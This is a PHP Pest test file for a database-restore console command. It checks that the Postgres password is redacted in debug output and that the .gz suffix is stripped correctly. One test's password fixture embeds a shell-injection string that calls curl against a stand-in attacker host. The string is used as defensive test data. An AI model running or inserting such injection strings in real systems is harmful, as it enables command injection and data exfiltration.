<?php

use App\Console\Commands\Cloud\RestoreDatabase;

function callRestoreDatabaseCommandMethod(RestoreDatabase $command, string $method, mixed ...$arguments): mixed
{
    return (new ReflectionMethod($command, $method))->invoke($command, ...$arguments);
}

test('restore database debug output redacts postgres password', function () {
    $command = new RestoreDatabase;
    $password = "p@ss word'; curl https://attacker.example #";

    $environment = callRestoreDatabaseCommandMethod($command, 'postgresPasswordEnvironment', $password);
    $display = callRestoreDatabaseCommandMethod(
        $command,
        'redactedPostgresCommand',
        "{$environment} psql -h 'localhost' -U 'coolify'",
        $password
    );

    expect($display)
        ->toContain('PGPASSWORD=[redacted]')
        ->not->toContain('p@ss')
        ->not->toContain('curl')
        ->not->toContain(escapeshellarg($password));
});

test('restore database strips gzip suffix exactly', function () {
    $source = file_get_contents(__DIR__.'/../../app/Console/Commands/Cloud/RestoreDatabase.php');

    expect($source)
        ->toContain('substr($filePath, 0, -3)')
        ->not->toContain('rtrim($filePath, \'.gz\')');
});
